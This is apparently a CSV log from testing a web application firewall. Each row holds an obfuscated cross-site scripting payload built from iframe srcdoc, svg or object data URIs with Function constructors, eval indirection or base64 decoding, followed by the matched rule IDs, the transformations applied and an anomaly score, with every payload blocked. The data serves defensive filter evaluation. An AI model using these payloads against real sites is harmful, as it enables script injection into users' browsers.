1607,"<iframe srcdoc=""<script>new Function('return \\u0061lert(1)')();</script>""></iframe>",0,1,block,6,"934100,941100,941110,941160,942100,949110","o24,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,84 || ",25,177603467733.972461
1608,"<iframe srcdoc=""<script>Function['constructor']('\\u0061lert(1)')();</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o32,35v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603467828.044750
1615,"<iframe srcdoc=""<script>new Function(['return \\u0061lert(1)'][0])();</script>""></iframe>",0,1,block,6,"934100,941100,941110,941160,942100,949110","o24,13v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,89 || ",25,177603468570.492058
1621,"<iframe srcdoc=""<script>new/**/ Function('return \\u0061lert(1)')();</script>""></iframe>",0,1,block,5,"941100,941110,941160,942100,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,88 || ",20,177603469282.099100
1622,"<iframe srcdoc=""<script>new/**/Function('return \\u0061lert(1)')();</script>""></iframe>",0,1,block,5,"941100,941110,941160,942100,949110","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,87 || ",20,177603469326.086925
1623,"<iframe srcdoc=""<script>new Function('return \\u{61}lert(1)')();</script>""></iframe>",0,1,block,6,"934100,941100,941110,941160,942100,949110","o24,13v217,84 || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,84 || ",25,177603469432.694186
1626,"<iframe srcdoc=""<script>new Function(['re','turn \\u0061lert(1)'].join(''))();</script>""></iframe>",0,1,block,6,"934100,941100,941110,941160,942100,949110","o24,13v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,98 || ",25,17760346973.066689
1643,"<iframe srcdoc=""<script>Function('ale'+'rt(1)')();void(0)</script>""></iframe>",0,1,block,7,"933210,941100,941110,941160,942100,942100,949110","o32,25v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,77 || v217,77t:urlDecodeUni || ",30,177603471643.430783
1644,"<iframe srcdoc=""<script>[]['constructor']['constructor']('ale'+'rt(1)')();void(0)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o24,57v217,101t:urlDecode,t:replaceComments,t:compressWhitespace || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603471720.171396
1673,"<iframe srcdoc=""<script>setTimeout(function(){with(top)eval('ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,7,"933160,934100,934100,941100,941110,941160,949110","o55,23v217,98 || o35,11v217,98 || o35,11v217,98t:urlDecodeUni || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603475057.559593
1674,"<iframe srcdoc=""<script>setTimeout(function(){self.Function('ale'+'rt(1)')()},0)</script>""></iframe>",0,1,block,7,"933210,934100,934100,941100,941110,941160,949110","o34,46v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,100 || o35,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603475148.368609
1676,"<iframe srcdoc=""<script>setTimeout(function(){(function(){return this})()['ev'+'al']('ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,8,"932100,933210,934100,934100,941100,941110,941160,949110","o43,12v217,123 || o34,69v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,123 || o35,11v217,123t:urlDecodeUni || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603475465.644065
1678,"<iframe srcdoc=""<script>setTimeout(function(){[]['constructor']['constructor']('ale'+'rt(1)')()},0)</script>""></iframe>",0,1,block,7,"933210,934100,934100,941100,941110,941160,949110","o34,65v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,119 || o35,11v217,119t:urlDecodeUni || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603475639.663151
1679,"<iframe srcdoc=""<script>setTimeout(function(){this['ev'+'al'].call(this,'ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,7,"934100,934100,941100,941110,941160,941370,949110","o35,11v217,110 || o35,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,15v217,110t:urlDecodeUni,t:compressWhitespace || ",30,177603475767.136645
1680,"<iframe srcdoc=""<script>setTimeout(function(){(1,eval)('ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,7,"933210,934100,934100,941100,941110,941160,949110","o34,39v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,93 || o35,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603475845.358414
1682,"<iframe srcdoc=""<script>setTimeout(function(){globalThis.eval('ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,7,"933160,934100,934100,941100,941110,941160,949110","o57,23v217,100 || o35,11v217,100 || o35,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603476022.325966
1683,"<iframe srcdoc=""<script>setTimeout(function(){Reflect.apply(eval,null,['ale'+'rt(1)'])},0)</script>""></iframe>",0,1,block,6,"934100,934100,941100,941110,941160,949110","o35,11v217,110 || o35,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603476115.104118
1684,"<iframe srcdoc=""<script>setTimeout(function(){Reflect.construct(Function,['ale'+'rt(1)'])()},0)</script>""></iframe>",0,1,block,7,"933210,934100,934100,941100,941110,941160,949110","o73,22v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,115 || o35,11v217,115t:urlDecodeUni || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603476269.884850
1685,"<iframe srcdoc=""<script>setTimeout(function(){Object.constructor.constructor('ale'+'rt(1)')()},0)</script>""></iframe>",0,1,block,7,"933210,934100,934100,941100,941110,941160,949110","o34,63v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,117 || o35,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760347635.979008
1686,"<iframe srcdoc=""<script>setTimeout(function(){Error.constructor.constructor('ale'+'rt(1)')()},0)</script>""></iframe>",0,1,block,7,"933210,934100,934100,941100,941110,941160,949110","o34,62v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,116 || o35,11v217,116t:urlDecodeUni || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603476439.249942
1696,"<iframe srcdoc=""<script>var a=top; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o36,15v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603477527.046213
1697,"<iframe srcdoc=""<script>var a=self; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o37,15v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603477666.683271
1700,"<iframe srcdoc=""<script>var a=window; Function('ale'+'rt(1)')();</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603477945.313587
1702,"<iframe srcdoc=""<script>var a=frames; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o39,15v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603478258.014524
1703,"<iframe srcdoc=""<script>var a=parent; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o39,15v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603478377.086876
1705,"<iframe srcdoc=""<script>var a=this; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o37,15v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603478536.144764
1706,"<iframe srcdoc=""<script>var a=globalThis; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"933210,941100,941110,941160,949110","o43,15v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603478615.577448
1708,"<iframe srcdoc=""<svg><script>Function('ale'+'rt(9)')()</script></svg>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603478849.696119
1717,"<iframe srcdoc=""<svg><script>this['Function']('ale'+'rt(9)')()</script></svg>""></iframe>",0,1,block,6,"933210,941100,941110,941160,941370,949110","o33,29v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,16v217,88t:urlDecodeUni,t:compressWhitespace || ",25,177603479955.518388
1727,"<iframe srcdoc=""<svg><script>Function('ale'+'rt(1)')()</script></svg>"">",0,1,block,4,"941100,941110,941160,949110","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603481024.124499
1733,"<iframe srcdoc=""<svg><script>window['Function']('ale'+'rt(1)')()</script></svg>"">",0,1,block,6,"933210,941100,941110,941160,941370,949110","o35,29v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,18v217,81t:urlDecodeUni,t:compressWhitespace || ",25,177603481648.424299
1742,"<iframe srcdoc=""<svg><script>with(top)Function('ale'+'rt(1)')()</script></svg>"">",0,1,block,4,"941100,941110,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603482610.699099
1745,"<iframe srcdoc=""<svg><script>globalThis.Function('ale'+'rt(1)')()</script></svg>"">",0,1,block,4,"941100,941110,941160,949110","v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603482925.236236
1747,"<object data=""data:text/html,<script>(new Function(String.fromCharCode(97,108,101,114,116,40,53,41)))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,67v217,114t:urlDecodeUni,t:cmdLine || o38,13v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603483268.816879
1749,"<object data=""data:text/html,<script>(new(window.Function)('al'+'ert(5)'))()</script>"">",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,36v217,87t:urlDecodeUni,t:cmdLine || o37,39v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603483450.243033
1751,"<object data=""data:text/html,<script>(new/**/Function/**/(atob('YWxlcnQoNSk=')))()</script>"">",0,1,block,9,"932130,941100,941110,941130,941140,941160,941170,941300,949110","o35,44v217,93t:urlDecodeUni,t:cmdLine || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,17760348368.707822
1763,"<object data=""data:text/html,<script>(new Function(String.fromCodePoint(0x61,0x6c,0x65,0x72,0x74,0x28,0x35,0x29)))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,80v217,127t:urlDecodeUni,t:cmdLine || o38,13v217,127 || v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,127t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603484926.095511
1767,"<object data=""data:text/html,<script>(new Function(String.fromCharCode(97,108,101,114,116,40,49,50,41)))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941140,941160,941170,941300,949110","o35,70v217,117t:urlDecodeUni,t:cmdLine || o38,13v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603485420.019381
1769,"<object data=""data:text/html,<script>(Function['constructor'](atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,10,"932130,933210,941100,941110,941130,941140,941160,941170,941300,949110","o35,46v217,97t:urlDecodeUni,t:cmdLine || o37,49v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177603485647.898110
1770,"<object data=""data:text/html,<script>(window['Function'](atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,11,"932130,933210,941100,941110,941130,941140,941160,941170,941300,941370,949110","o35,41v217,92t:urlDecodeUni,t:cmdLine || o37,44v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,37v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,18v217,92t:urlDecodeUni,t:compressWhitespace || ",50,177603485725.317034
